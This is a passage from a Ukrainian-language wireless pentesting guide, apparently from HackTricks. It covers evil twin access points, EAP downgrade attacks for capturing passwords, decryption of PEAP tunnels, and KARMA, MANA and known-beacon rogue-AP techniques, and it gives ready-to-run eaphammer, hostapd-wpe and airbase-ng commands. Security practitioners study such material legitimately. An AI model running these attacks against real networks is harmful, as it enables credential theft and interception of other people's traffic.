- **Складнощі виконання**: Успішне проведення атаки evil twin у середовищах з кількома добре розташованими access points може бути проблематичним. Deauthenticating однієї легітимної access point часто призводить до того, що пристрій підключається до іншої легітимної access point, якщо атакувальник не може деаутентифікувати всі сусідні access points або стратегічно розмістити зловмисну access point.

Ви можете створити дуже базовий Open Evil Twin (без можливостей маршрутизації трафіку в Internet), роблячи:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Ви також можете створити Evil Twin за допомогою **eaphammer** (зверніть увагу, що щоб створити evil twins з eaphammer інтерфейс **should NOT be** у **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Або використовуючи Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Будь ласка, зауважте, що за замовчуванням, якщо ESSID у PNL збережено як WPA захищений, пристрій не підключатиметься автоматично до Open evil Twin. Ви можете спробувати DoS реальний AP і сподіватися, що користувач вручну підключиться до вашого Open evil twin, або ви можете DoS реальний AP і використати WPA Evil Twin для перехоплення handshake (використовуючи цей метод ви не зможете дозволити жертві підключитися до вас, оскільки ви не знаєте PSK, але ви можете перехопити handshake та спробувати crack it).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

Ви можете створити **Evil Twin using WPA/2** і якщо пристрої налаштовано підключатися до того SSID з WPA/2, вони спробують підключитися. Проте, щоб **to complete the 4-way-handshake**, вам також потрібно **знати** **пароль**, який клієнт збирається використовувати. Якщо ви **не знаєте** його, **підключення не буде завершено**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Щоб зрозуміти ці атаки, рекомендую спочатку прочитати коротке [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Використання hostapd-wpe**

`hostapd-wpe` потребує **файлу конфігурації** для роботи. Щоб **автоматизувати** генерацію цих конфігурацій, ви можете використати [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (завантажте python-файл всередині _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
У конфігураційному файлі можна вибрати багато різних параметрів, таких як ssid, channel, user files, cret/key, dh parameters, wpa version та auth...

[**Використання hostapd-wpe з EAP-TLS, щоб дозволити будь-якому сертифікату увійти.**](evil-twin-eap-tls.md)

**Використання EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
За замовчуванням EAPHammer пропонує такі методи аутентифікації (зверніть увагу: GTC — перший, який намагається отримати plaintext passwords, після чого використовуються більш стійкі auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Це методологія за замовчуванням, щоб уникнути довгого часу підключення. Однак ви також можете вказати серверу методи автентифікації від найслабших до найсильніших:
```
--negotiate weakest
```
Або ви також можете використовувати:

- `--negotiate gtc-downgrade` щоб використати високоефективну реалізацію пониження GTC (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` щоб вручну вказати запропоновані методи (пропонуючи ті ж auth methods у тому самому порядку, що й у організації, атаку буде набагато важче виявити).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` може використовувати раніше згенеровані сертифікати, щоб запропонувати EAP-аутентифікацію для WPA/WPA2-Enterprise мереж. Фальшива мережа понизить протокол з'єднання до EAP-MD5, тож вона зможе **захопити користувача та MD5 пароля**. Потім нападник може спробувати зламати пароль.\
`Airggedon` надає вам можливість **безперервної атаки Evil Twin (noisy)** або **лише створити Evil Attack до того, як хтось підключиться (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Цей метод був протестований при PEAP-з'єднанні, але оскільки я розшифровую довільний TLS-тунель, це також має працювати з EAP-TTLS_

У **конфігурації** _hostapd-wpe_ **закоментуйте** рядок, що містить _**dh_file**_ (з `dh_file=/etc/hostapd-wpe/certs/dh` на `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Це змусить `hostapd-wpe` **обмінюватися ключами з використанням RSA** замість DH, тому ви зможете **розшифрувати** трафік пізніше, **маючи приватний ключ сервера**.

Тепер запустіть **Evil Twin** за допомогою **`hostapd-wpe`** з цією зміненою конфігурацією як зазвичай. Також запустіть **`wireshark`** на **інтерфейсі**, що здійснює атаку Evil Twin.

Тепер або пізніше (коли ви вже захопили деякі наміри автентифікації) ви можете додати приватний RSA-ключ у wireshark в: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Додайте новий запис і заповніть форму такими значеннями: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

І подивіться на нову вкладку **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Різні типи Media Access Control Filter Lists (MFACLs) та їх відповідні режими і вплив на поведінку зловмисного Access Point (AP):

1. **MAC-based Whitelist**:
- Зловмисний AP відповідатиме лише на probe requests від пристроїв, вказаних у whitelist, залишаючись невидимим для всіх інших, хто не в списку.
2. **MAC-based Blacklist**:
- Зловмисний AP ігноруватиме probe requests від пристроїв у blacklist, що фактично робить зловмисний AP невидимим для цих конкретних пристроїв.
3. **SSID-based Whitelist**:
- Зловмисний AP відповідатиме на probe requests лише для конкретних ESSIDs у списку, роблячи його невидимим для пристроїв, чиї Preferred Network Lists (PNLs) не містять цих ESSIDs.
4. **SSID-based Blacklist**:
- Зловмисний AP не відповідатиме на probe requests для конкретних ESSIDs у blacklist, роблячи його невидимим для пристроїв, які шукають саме ті мережі.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Цей метод дозволяє **зловмиснику створити шкідливу access point (AP), яка відповідає на всі probe requests** від пристроїв, що намагаються підключитися до мереж. Ця техніка **обманює пристрої, змушуючи їх підключатися до AP зловмисника** шляхом імітації мереж, які пристрої шукають. Коли пристрій надсилає запит на підключення до цього rogue AP, підключення відбувається, в результаті чого пристрій помилково підключається до мережі зловмисника.

### MANA

Потім **пристрої почали ігнорувати ненадійні мережеві відповіді**, що зменшило ефективність оригінальної karma attack. Однак був представлений новий метод, відомий як **MANA attack**, який запропонували Ian de Villiers та Dominic White. Цей метод передбачає, що rogue AP **перехоплює Preferred Network Lists (PNL) з пристроїв, відповідаючи на їх broadcast probe requests** іменами мереж (SSIDs), які раніше були збережені пристроями. Ця складна атака обходить захисти від оригінальної karma attack, використовуючи спосіб, яким пристрої запам'ятовують та пріоритезують відомі мережі.

MANA attack працює шляхом моніторингу як directed, так і broadcast probe requests від пристроїв. Для directed запитів він записує MAC address пристрою та ім'я запитуваної мережі, додаючи цю інформацію до списку. Коли надходить broadcast request, AP відповідає інформацією, що відповідає будь-якій мережі зі списку пристрою, спокушаючи пристрій підключитися до rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** — це просунута стратегія на випадок, коли пристрої не використовують directed probing або коли їх Preferred Network Lists (PNL) невідомі нападникові. Вона базується на принципі, що **пристрої в одній зоні ймовірно мають спільні назви мереж у своїх PNL**. Замість вибіркової відповіді ця атака розсилає probe responses для кожної назви мережі (ESSID), знайденої в об'єднаних PNL усіх спостережуваних пристроїв. Такий широкий підхід підвищує ймовірність того, що пристрій впізнає знайому мережу й спробує підключитися до rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Коли **Loud MANA attack** може виявитися недостатньою, **Known Beacon attack** пропонує інший підхід. Цей метод **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** derived from a wordlist. Це імітує наявність великої кількості мереж, сподіваючись співпасти з ESSID у PNL жертви, що викликає спробу підключення до сфальсифікованого AP. Атака може бути посилена шляхом поєднання її з опцією `--loud` для більш агресивної спроби завести пристрої в пастку.

Eaphammer реалізував цю атаку як MANA attack, де всі ESSIDs із списку транслюються (ви також можете поєднати це з `--loud`, щоб створити Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Атака **Known Beacon Burst attack** передбачає **швидку послідовну трансляцію beacon frames для кожного ESSID, перерахованого у файлі**. Це створює щільне середовище фейкових мереж, що значно підвищує ймовірність підключення пристроїв до rogue AP, особливо в поєднанні з MANA attack. Ця техніка використовує швидкість і обсяг, щоб перевантажити механізми вибору мережі пристроїв.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** — це протокол, який дозволяє пристроям з’єднуватися безпосередньо один з одним через Wi-Fi без необхідності традиційної бездротової точки доступу. Ця можливість інтегрована в різні пристрої Internet of Things (IoT), такі як принтери та телевізори, що полегшує прямий зв’язок пристрій‑до‑пристрою. Важливою особливістю Wi-Fi Direct є те, що один пристрій бере на себе роль точки доступу, відомої як group owner, для керування з’єднанням.

Забезпечення безпеки для Wi-Fi Direct-з’єднань реалізується через **Wi-Fi Protected Setup (WPS)**, який підтримує кілька методів для безпечного спарингу, зокрема:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ці методи, особливо PIN entry, уразливі до тих самих вад, що й WPS у традиційних Wi‑Fi мережах, що робить їх мішенями для подібних векторів атаки.

### EvilDirect Hijacking

**EvilDirect Hijacking** — це атака, специфічна для Wi‑Fi Direct. Вона відображає концепцію Evil Twin attack, але націлена на Wi‑Fi Direct-з’єднання. У цьому сценарії нападник видає себе за легітимного group owner з метою обманути пристрої та змусити їх підключитися до шкідливої сутності. Цей метод можна виконати за допомогою інструментів, таких як `airbase-ng`, вказавши канал, ESSID і MAC address імітованого пристрою:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Перегляньте [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
